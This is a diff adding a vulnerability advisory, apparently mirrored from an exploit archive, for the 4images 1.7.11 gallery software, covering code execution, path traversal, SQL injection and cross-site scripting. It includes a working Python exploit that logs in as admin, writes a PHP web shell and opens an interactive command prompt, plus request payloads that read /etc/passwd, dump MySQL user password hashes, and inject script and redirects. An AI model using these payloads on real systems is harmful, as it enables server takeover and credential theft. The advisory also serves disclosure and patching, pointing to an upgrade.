@@ -1,0 +1,387 @@
+id: 24699
+date: 12/10/2015
+title: 4images 1.7.11  - Multiple Vulnerabilities
+author: Tim Coen
+cves: 
+
+4images 1.7.11 Code Execution, Path Traversal, SQL Injection, Cross Site Scripting Vulnerabilities
+
+
+Description
+
+4images comes with a HTML Template editor which allows the editing of HTML
+files. But it will also create a new file if the passed file name does not
+already exist. When doing this, it does not check that the extension of the
+passed file is .html.
+
+Admin credentials are required to use the HTML template editor.
+
+ Proof of Concept
+
+
+        POST /4images/admin/templates.php HTTP/1.1
+
+        __csrf=28a9a05b480c3f8ed326523b1ce7532c&action=savetemplate&content=<?php passthru($_GET['x']);&template_file_name=categories.php&template_folder=default
+
+ Code
+
+
+        /admin/templates.php
+
+        if (isset($HTTP_GET_VARS['template_file_name']) || isset($HTTP_POST_VARS['template_file_name'])) {
+          $template_file_name = (isset($HTTP_GET_VARS['template_file_name'])) ? trim($HTTP_GET_VARS['template_file_name']) : trim($HTTP_POST_VARS['template_file_name']);
+          $template_file_name = (strpos($template_file_name, 'media/') !== false ? 'media/' : '') . basename($template_file_name);
+        }
+        else {
+          $template_file_name = "";
+        }
+
+        if ($action == "savetemplate") {
+          if (isset($HTTP_POST_VARS['content'])) {
+            $content = trim($HTTP_POST_VARS['content']);
+          }
+          else {
+            $content = "";
+          }
+
+                if ($template_file_name != "" && $content != "") {
+            $content = un_htmlspecialchars($content);
+            $content = stripslashes($content);
+            $fp = @fopen(ROOT_PATH.TEMPLATE_DIR."/".$template_folder."/".$template_file_name, "w+");
+            if (@fwrite($fp, $content)) {
+              $msg = $lang['template_edit_success'];
+            }
+            else {
+              $msg = sprintf("<span class=\"marktext\">%s</span>", $lang['template_edit_error']);
+            }
+          }
+          $action = "modifytemplates";
+        }
+
+
+------------------------------------
+
+#!/usr/local/bin/python
+# Exploit for 4images 1.7.11 Code Execution vulnerability
+# An admin account is required to use this exploit
+# Curesec GmbH
+
+import sys
+import re
+import argparse
+import requests # requires requests lib
+
+parser = argparse.ArgumentParser()
+parser.add_argument("url", help="base url to vulnerable site")
+parser.add_argument("username", help="admin username")
+parser.add_argument("password", help="admin password")
+args = parser.parse_args()
+
+url = args.url
+username = args.username
+password = args.password
+
+loginPath = "/admin/index.php"
+fileManagerPath = "/admin/templates.php"
+
+shellFileName = "404.php"
+shellContent = "<?php passthru($_GET['x']); ?>"
+
+def login(requestSession, url, username, password):
+    csrfRequest = requestSession.get(url)
+    csrfTokenRegEx = re.search('name="__csrf" value="(.*)" />', csrfRequest.text)
+    csrfToken = csrfTokenRegEx.group(1)
+
+    postData = {"action": "login", "redirect": ".%2F..%2Fadmin%2Findex.php", "__csrf": csrfToken, "loginusername": username, "loginpassword": password}
+    loginResult = requestSession.post(url, data = postData).text
+    return "loginpassword" not in loginResult
+
+def upload(requestSession, url, fileName, fileContent):
+    csrfRequest = requestSession.get(url)
+    csrfTokenRegEx = re.search('name="__csrf" value="(.*)" />', csrfRequest.text)
+    csrfToken = csrfTokenRegEx.group(1)
+
+    postData = {"action": "savetemplate", "content": fileContent, "template_file_name": fileName, "__csrf": csrfToken, "template_folder": "default"}
+    loginResult = requestSession.post(url, data = postData).text
+
+def runShell(url):
+    print("enter command, or enter exit to quit.")
+    command = raw_input("$ ")
+    while "exit" not in command:
+        print(requests.get(url + command).text)
+        command = raw_input("$ ")
+
+requestSession = requests.session()
+
+if login(requestSession, url + loginPath, username, password):
+    print("successful: login")
+else:
+    exit("ERROR: Incorrect username or password")
+
+upload(requestSession, url + fileManagerPath, shellFileName, shellContent)
+
+runShell(url + "/templates/default/" + shellFileName + "?x=")
+
+
+Blog Reference:
+https://blog.curesec.com/article/blog/4images-1711-Code-Execution-Exploit-117.html
+
+-------------------------------------------
+
+4images 1.7.11 Path Traversal
+
+
+Description
+
+When downloading or displaying a backup file, the file Parameter is vulnerable
+to directory traversal. This is the case because the get_basefile function
+contains a bug. When the passed path name ends with a slash, it will return the
+entire path instead of the file name.
+
+By adding ?/ to the file name, an attacker can thus download or display
+arbitrary files.
+
+Admin credentials are required to view or download backup files.
+
+ Proof of Concept
+
+
+GET /4images/admin/backup.php?action=downloadbackup&file=../../../../../../etc/passwd?/ HTTP/1.1
+GET /4images/admin/backup.php?action=showbackup&file=../../../../../../etc/passwd?/ HTTP/1.1
+
+ Code
+
+
+        /admin/bachup.php
+        if (isset($HTTP_GET_VARS['file']) || isset($HTTP_POST_VARS['file'])) {
+          $file = (isset($HTTP_GET_VARS['file'])) ? get_basefile(trim($HTTP_GET_VARS['file'])) : get_basefile(trim($HTTP_POST_VARS['file']));
+        }
+        else {
+          $file = "";
+        }
+
+        if ($action == "downloadbackup") {
+          $size = @filesize(ROOT_PATH.DATABASE_DIR."/".$file);
+          header("Content-type: application/x-unknown");
+          header("Content-length: $size\n");
+          header("Content-Disposition: attachment; filename=$file\n");
+          readfile(ROOT_PATH.DATABASE_DIR."/".$file);
+          exit;
+        }
+
+        /includes/functions.php
+        function get_basename($path) {
+          $path = str_replace("\\", "/", $path);
+          $name = substr(strrchr($path, "/"), 1);
+          return $name ? $name : $path;
+        }
+
+        function get_basefile($path) {
+          $basename = get_basename($path);
+          preg_match("#(.+)\?(.+)#", $basename, $regs);
+          return isset($regs[1]) ? $regs[1] : $basename;
+        }
+
+-------------------------------------
+
+4images 1.7.11 SQL Injection
+
+Description
+
+When backing up the database, the user can supply the tables that should be
+backed up. The program does not check if these tables actually belong to the
+4images database or to a different database. Because of this, it is possible to
+back up, and thus read, any database the database user has access to.
+
+However, even if there were a check for the database, it would still be
+possible to perform arbitrary SELECT statements by injecting into a SELECT
+query that looks like this: "SELECT * FROM $table" where $table is user
+supplied.
+
+Admin credentials are required to back up the database.
+
+ Proof of Concept
+
+
+POST /4images/admin/backup.php HTTP/1.1
+__csrf=43c557c252fe6f57db4720b23771c7ab&action=makebackup&db_tables%5B%5D=mysql.user
+
+POST /4images/admin/backup.php HTTP/1.1
+__csrf=43c557c252fe6f57db4720b23771c7ab&action=makebackup&db_tables%5B%5D=4images_comments where comment_id=-1 union all select user,password,3,4,5,6,7,8 from mysql.user
+
+----------------------------------------
+
+4images 1.7.12 Cross Site Scripting
+
+2. Overview
+
+There are two reflected XSS vulnerabilities in 4images, as well as a persistent
+Open Redirect, which may also lead to XSS in older browsers.
+
+This allows an attacker to execute arbitrary JavaScript in the context of the
+browser of a victim if the victim clicks on an attacker supplied link or visits
+an attacker controlled website. With this, it is possible to bypass CSRF
+protection and thus do anything the victim can do, inject a JavaScript
+keylogger, or perform phishing attacks.
+
+It should be noted that the XSS vulnerability still existed in another form in
+the first release of version 1.17.13 and has been fixed with an update to that
+version.
+
+3. Reflected XSS 1
+
+CVSS
+
+Medium 4.3 AV:N/AC:M/Au:N/C:N/I:P/A:N
+
+Description
+
+When displaying the form to add new images, $_SERVER['PHP_SELF'] is echoed
+unencoded inside a select tag. Because of this, additional attributes can be
+added and new HTML tags can be created, leading to XSS.
+
+Proof of Concept
+
+Prior to Version 1.7.12:
+
+
+http://localhost/4images/admin/images.php/" onfocus=alert(1) autofocus foo="?action=addimages
+
+Version 1.7.13 (before update):
+
+
+http://localhost/4images/admin/images.php/');alert(1);window.location=('?action=addimages
+
+This required a click of the victim to trigger, and a redirect will be
+performed after the execution of the injected code.
+
+Code
+
+
+        /admin/images.php
+        show_num_select_row(" ", "num_newimages", $lang['num_addnewimages_desc']);
+
+        /admin/admin_functions.php
+        function show_num_select_row($title, $option, $desc = "") {
+          global $site_sess, $PHP_SELF, $action, $$option;
+          echo "<tr class=\"".get_row_bg()."\">\n<td><p>".$title."</p></td>\n";
+          echo "<td align=\"right\"><p>".$desc;
+          $url = $PHP_SELF;
+          $url .= preg_match("/\?/", $url) ? "&" : "?";
+          $url .= "action=".$action;
+          $url = $site_sess->url($url);
+          echo "<select name=\"num\" onchange=\"window.location=('".$url."&";
+          echo $option."='+this.options[this.selectedIndex].value)\">\n";
+          for ($i = 1; $i < 11; $i++) {
+            echo "<option value=\"$i\"";
+            if ($i == ${$option}) {
+              echo " selected";
+            }
+            echo ">".$i."</option>\n";
+          }
+          echo "</select></p></td>\n</tr>\n";
+        }
+
+ Reflected XSS 2
+
+CVSS
+
+Medium 4.3 AV:N/AC:M/Au:N/C:N/I:P/A:N
+
+Description
+
+User input is echoed inside the src attribute of a frame, which makes it
+possible to execute javascript.
+
+Proof of Concept
+
+
+http://localhost/4images/admin/index.php?goto=javascript:alert%281%29
+
+Code
+
+
+        /admin/index.php
+        if ($action == "") {
+          $action = "frames";
+        }
+
+        if ($action == "frames") {
+          if ($goto != "" && strpos($goto, '://') === false) {
+            $framesrc = $site_sess->url($goto);
+          }
+          else {
+            $framesrc = $site_sess->url("home.php");
+          }
+        ?>
+        <html dir="<?php echo $lang['direction']; ?>">
+          <head>
+            <title><?php echo $config['site_name']; ?> Control Panel</title>
+            <meta http-equiv="Content-Type" content="text/html; charset=<?php echo $lang['charset']; ?>">
+          </head>
+          <frameset rows="70,*" framespacing="0" border="0" frameborder="0" frameborder="no" border="0">
+            <frame src="<?php echo $site_sess->url("index.php?action=head"); ?>" name="head" scrolling="NO" NORESIZE frameborder="0" marginwidth="0" marginheight="0" border="no">
+            <frameset cols="216,*"  framespacing="0" border="0" frameborder="0" frameborder="no" border="0">
+              <frame src="<?php echo $site_sess->url("index.php?action=nav"); ?>" name="nav" scrolling="auto" NORESIZE frameborder="0" marginwidth="0" marginheight="0" border="no">
+              <frame src="<?php echo $framesrc ?>" name="main" scrolling="auto" NORESIZE frameborder="0" marginwidth="20" marginheight="20" border="no">
+            </frameset>
+          </frameset>
+        </html>
+
+ Persistent Open Redirect
+
+CVSS
+
+Medium 4.3 AV:N/AC:M/Au:N/C:N/I:P/A:N
+
+Description
+
+When showing an uploaded image, the description and keyword are not properly
+encoded. Tags are removed, but it is still possible to add further attributes
+to the meta tag they are inserted into.
+
+This makes it possible to inject a redirect. This redirect will be persistent,
+meaning anyone visiting the site of the uploaded image will be redirected to an
+attacker controlled website.
+
+The attacker needs the rights to upload images to perform the attack, which
+means that a category needs to exist where anyone can upload images, or a
+category needs to exist where registered users can upload images and the
+registration must be open - which it is by default.
+
+Proof of Concept
+
+Upload an image, as description or keyword use:
+
+Version 1.7.11 and earlier:
+    5;URL=http://google.com/" http-equiv="refresh" foo="
+Version 1.7.12:
+    5;URL=http://google.com/" http-equiv=refresh foo="
+
+When visiting the page of the uploaded image, a redirect will be performed.
+
+With older browsers, it will be possible to inject and execute javascript as
+well.
+
+Code
+
+
+        details.php
+            $meta_keywords  = !empty($image_row['image_keywords']) ? strip_tags(implode(", ", explode(",", $image_row['image_keywords']))) : "";
+            $meta_description = !empty($image_row['image_description']) ? strip_tags($image_row['image_description']) . ". " : "";
+
+            $site_template->register_vars(array(
+                    "detail_meta_description"   => $meta_description,
+                    "detail_meta_keywords"      => $meta_keywords,
+                    "prepend_head_title"        => $image_name . " - ",
+                    ));
+
+ Solution
+
+To mitigate this issue please upgrade at least to version 1.7.13:
+
+http://www.4homepages.de/download-4images
+
+Please note that a newer version might already be available.
+
+#  0day.today [2023-03-23]  #
